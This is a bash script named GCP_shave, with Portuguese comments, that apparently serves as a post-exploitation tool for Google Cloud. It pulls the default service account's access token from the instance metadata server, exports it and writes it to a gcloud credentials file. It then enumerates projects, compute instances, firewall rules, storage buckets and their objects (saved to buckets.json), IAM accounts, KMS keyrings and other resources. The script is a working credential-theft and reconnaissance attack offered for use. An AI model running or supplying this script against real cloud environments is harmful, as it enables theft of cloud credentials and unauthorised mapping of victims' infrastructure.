#!/bin/bash

# ================== GCP_shave ==================

echo -e "\033[0;32m"
cat << "EOF"
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⠴⡿⠓⠶⠾⠿⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⠖⠻⠷⡶⣮⡙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⢀⣚⡯⠉⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣄⣀⣀⣀⣀⣠⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⠀⠀⠀⠀⠀⠀⠀⢀⣰⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠉⠉⠛⠿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣾⣉⠳⠄⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣅⡀⠉⠁⠀⠀⠀⠀⢠⣴⣤⡀⠀⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀  ██████   █████   █    ██ ▓█████ ▄▄▄       ██ ▄█▀     ▄▄▄█████▓ ██░ ██ ▓█████        ▄████▄   ██▓     ▒█████   █    ██ ▓█████▄
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⣾⠿⠁⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠀⠀⠀⠀⠀⠉⠻⣦⠀⠀⠀⠀▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▓█   ▀▒████▄     ██▄█▒      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀       ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██  ▓██▒▒██▀ ██▌
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠋⠁⢀⣼⡧⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢶⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣴⡒⠒⠶⣤⣿⠀⠀⠀⠀ ░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒███  ▒██  ▀█▄  ▓███▄░      ▒ ▓██░ ▒░▒██▀▀██░▒███         ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▒██░░██   █▌
    ⠀⠀⠀⠀⠀⠀⠀⢀⡴⠏⠁⠀⢀⣠⣼⡟⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣤⠀⠀⠀⠤⠖⠚⠉⠉⣀⡠⠤⠒⢲⡆⠁⢀⡴⢩⡿⢤⡀⠀⠀   ▒   ██▒░██  █▀ ░▓▓█  ░██░▒▓█  ▄░██▄▄▄▄██ ▓██ █▄ ░      ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄       ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓▓█  ░██░░▓█▄   ▌
    ⠀⠀⠀⠀⠀⢀⣴⠋⠀⢀⣴⠞⠋⠉⢸⡇⠀⠀⠀⠀⠀⠀⠀⢽⣟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠀⠀⠀⠀⠀⢀⡠⠖⠋⠁⢀⣤⣾⣥⠤⠴⠛⠋⠉⠙⣆⠉⠢⡄ ▒██████▒▒░▒███▒█▄ ▒▒█████▓ ░▒████▒▓█   ▓██▒▒██▒ █▄       ▒██▒ ░ ░▓█▒░██▓░▒████▒      ▒ ▓███▀ ░░██████▒░ ████▓▒░▒▒█████▓ ░▒████▓ 
    ⠀⠀⠀⠀⣠⠟⠁⢠⡾⠋⠁⠀⠀⠀⣼⡇⠀⡀⠀⠀⠀⠀⠀⢰⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠋⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠈ ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒       ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░      ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒  ▒▒▓  ▒
    ⠀⠀⠀⣴⠋⢀⡴⠋⠀⠀⠀⠀⠀⠀⣿⠿⢛⣣⣄⣀⡀⠀⠀⠀⢨⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢠⣄⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀ ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░  ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░         ░     ▒ ░▒░ ░ ░ ░  ░        ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░░▒░ ░ ░  ░ ▒  ▒
    ⠀⠀⣼⠇⢀⡟⠁⠀⠀⠀⠀⠀⠀⠰⣿⠀⠈⠈⢻⣟⠉⠉⠉⠉⠉⠛⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⢠⣶⠏⢸⠛⠛⠒⢲⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ░  ░  ░     ░   ░  ░░░ ░ ░    ░    ░   ▒   ░ ░░ ░        ░       ░  ░░ ░   ░         ░          ░ ░   ░ ░ ░ ▒   ░░░ ░ ░  ░ ░  ░ 
    ⠀⢠⡟⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⡀⣿⣷⣄⠀⠀⠀⠀⠀⠀⠙⠿⣿⣀⢀⣀⣤⣄⠀⠀⠀⠀⣀⣀⣾⣿⣿⣄⣠⣏⠀⠀⠀⠺⣯⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀       ░      ░       ░        ░  ░     ░  ░░  ░                  ░  ░  ░   ░  ░      ░ ░          ░  ░    ░ ░     ░        ░  
    ⠀⣸⡇⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠘⣷⣤⢹⣄⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠻⣯⣤⣴⣦⣾⠷⣿⡋⠀⠀⠈⠉⢹⣿⣦⣿⠛⢷⣬⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                          ░                                   ░  
    ⠀⣿⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡏⠙⢿⠟⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣯⡀⠀⠀⠈⢿⡷⣦⡀⠀⢸⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢻⡇⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡏⠀⣇⠘⡆⢳⣬⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣸⡇⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡾⢻⣶⠿⣶⡏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣿⠃⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠉⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣼⣏⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⣼⣿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

EOF
echo -e "\e[0m"

get_token() {
  curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --max-time 3 --retry 3
}

get_service_account() {
  curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" | head -n1
}

export_credentials() {
  ACCESS_TOKEN=$(echo "$1" | jq -r .access_token)
  EXPIRATION=$(echo "$1" | jq -r .expires_in)

  export GCP_ACCESS_TOKEN=$ACCESS_TOKEN
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$ACCESS_TOKEN

  mkdir -p ~/.config/gcloud
  cat > ~/.config/gcloud/access_token.json <<EOF
{
  "access_token": "$ACCESS_TOKEN",
  "expires_in": $EXPIRATION,
  "token_type": "Bearer"
}
EOF
}

list_gcp_resources() {
  echo -e "${CYAN}Enumerando recursos GCP...${RESET}"

  gcloud projects list
  gcloud compute instances list
  gcloud compute networks list
  gcloud compute firewall-rules list
  gcloud compute addresses list

  echo -e "${BLUE}[*] Verificando buckets...${RESET}"
  buckets=$(gcloud storage buckets list --format="value(name)")

  if [[ -n "$buckets" ]]; then
    echo -e "${GREEN}[+] Buckets encontrados:${RESET}"
    echo "$buckets"
    list_buckets_and_objects_json  # 🔥 Chama sua função que monta o JSON
  else
    echo -e "${YELLOW}[-] Nenhum bucket encontrado.${RESET}"
  fi

  gcloud sql instances list
  gcloud functions list
  gcloud pubsub topics list
  gcloud pubsub subscriptions list
  gcloud iam service-accounts list
  gcloud kms keyrings list --locations=global
  gcloud dns managed-zones list
  gcloud container clusters list
  gcloud logging sinks list
}

run_gcp_shave() {

  echo -e "${BLUE}[*] Obtendo token da metadata API...${RESET}"
  TOKEN_RESPONSE=$(get_token)
  if [[ -z "$TOKEN_RESPONSE" ]]; then
    echo -e "${RED}[X] Erro: Não foi possível obter o token.${RESET}"
    exit 1
  fi
  echo -e "${GREEN}[+] Token obtido com sucesso.${RESET}"

  echo -e "${BLUE}[*] Identificando Service Account vinculada...${RESET}"
  SERVICE_ACCOUNT=$(get_service_account)
  if [[ -z "$SERVICE_ACCOUNT" ]]; then
    echo -e "${RED}[X] Erro: Não foi possível obter a Service Account.${RESET}"
    exit 1
  fi
  echo -e "${GREEN}[+] Service Account: $SERVICE_ACCOUNT${RESET}"

  echo -e "${BLUE}[*] Exportando credenciais...${RESET}"
  export_credentials "$TOKEN_RESPONSE"
  echo -e "${GREEN}[+] Credenciais exportadas com sucesso.${RESET}"

  echo -e "${YELLOW}[!] Iniciando enumeração dos recursos GCP...${RESET}"
  list_gcp_resources

  echo -e "${GREEN}[✓] Enumeração GCP finalizada.${RESET}"
}


list_buckets_and_objects_json() {
    echo "[+] Enumerando Buckets e Objetos da GCP..."

    output="["

    # Lista todos os buckets do projeto atual
    buckets=$(gsutil ls 2>/dev/null | sed 's/gs:\/\///g')

    if [[ -z "$buckets" ]]; then
        echo "[-] Nenhum bucket encontrado ou falta de permissão."
        return
    fi

    for bucket in $buckets; do
        echo "[*] Bucket encontrado: $bucket"

        output+="
        {
            \"Nome_bucket\": \"$bucket\",
            \"Objetos_bucket\": ["
        
        objetos=$(gsutil ls gs://$bucket 2>/dev/null)

        if [[ -z "$objetos" ]]; then
            output+="\"<vazio>\""
        else
            for obj in $objetos; do
                nome_obj=$(basename "$obj")
                output+="\"$nome_obj\","
            done
            output=${output%,}  # Remove a última vírgula
        fi

        output+="]
        },"
    done

    output=${output%,}  # Remove a última vírgula

    output+="
]"

    # Salva o JSON em um arquivo
    echo -e "$output" > buckets.json
    echo "[+] Resultado salvo em buckets.json"
}


 
run_gcp_shave
